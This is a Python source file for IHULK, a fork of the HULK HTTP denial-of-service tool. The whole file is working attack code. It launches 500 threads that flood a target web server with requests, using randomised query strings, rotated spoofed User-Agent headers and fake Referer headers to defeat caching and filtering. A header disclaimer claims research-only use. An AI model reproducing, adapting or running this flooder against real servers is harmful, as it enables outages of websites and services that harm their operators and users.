# ----------------------------------------------------------------------------------------------
# IHULK - Improved HTTP Unbearable Load King
#
# this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
# to their knees by exhausting the resource pool, its is meant for research purposes only
# and any malicious usage of this tool is prohibited.
#
# orginal author :  Barry Shteiman , version 1.0
# edited and maintained by : Aamir khan
# ----------------------------------------------------------------------------------------------

from urllib.request import Request, urlopen, HTTPError, URLError
import sys
import threading
from random import randint, choice
import re

# global params
url = host = ''
user_agents = []
referes = []
request_counter = flag = safe = 0
# lock = threading.Lock()

# user agents list
user_agents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
user_agents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
user_agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
user_agents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
user_agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
user_agents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
user_agents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
user_agents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
user_agents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
user_agents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
user_agents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
user_agents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')

# generates a referer array
referes.append('https://www.google.com/?q=')
referes.append('http://www.usatoday.com/search/results?q=')
referes.append('http://engadget.search.aol.com/search?q=')
referes.append('http://' + host + '/')


def inc_counter():
    global request_counter
    # lock.acquire()
    request_counter += 1
    # lock.release()


def set_flag(val):
    global flag
    flag = val


def set_safe():
    global safe
    safe = 1


# builds random ascii string
def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = randint(65, 90)
        out_str += chr(a)
    return(out_str)


def usage():
    print ('---------------------------------------------------')
    print ('USAGE: python ddos.py <url>')
    print ('you can add "safe" after url, to autoshut after dos')
    print ('---------------------------------------------------')


# http request
def httpcall(url):
    response_code = 0
    param_joiner = "&" if url.count("?") > 0 else "?"
    param = buildblock(randint(3, 10))
    param_val = buildblock(randint(3, 10))
    request = Request(url + param_joiner + param + '=' + param_val)
    request.add_header('User-Agent', choice(user_agents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', choice(referes) + buildblock(randint(5, 10)))
    request.add_header('Keep-Alive', randint(110, 120))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)

    try:
        urlopen(request)
        inc_counter()
    except HTTPError as e:
        set_flag(1)
        print('Response code 500')
        response_code = 500
    except URLError as e:
        print(e.reason)
        sys.exit()

    return(response_code)


# http caller thread
class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                response_code = httpcall(url)
                if (response_code == 500) & (safe == 1):
                    set_flag(2)
        except Exception as ex:
            pass


# monitors http threads and counts requests
class MonitorThread(threading.Thread):
    def run(self):
        previous = 0
        while flag == 0:
            if (previous < request_counter) & (previous != request_counter):
                print("%d Requests Sent" % (request_counter))
                previous = request_counter + 100
        if flag == 2:
            print("\n-- DOS Attack Finished --")


# execute
if len(sys.argv) < 2 or sys.argv[1] == "help":
    usage()
    sys.exit()
else:
    print("-- DOS Attack Started --")
    if len(sys.argv) == 3:
        if sys.argv[2] == "safe":
            set_safe()
    url = sys.argv[1]
    if url.count("/") == 2:
        url = url + "/"
    m = re.search('https?\://([^/]*)/?.*', url)
    host = m.group(1)
    for i in range(500):
        t = HTTPThread()
        t.start()
    t = MonitorThread()
    t.start()
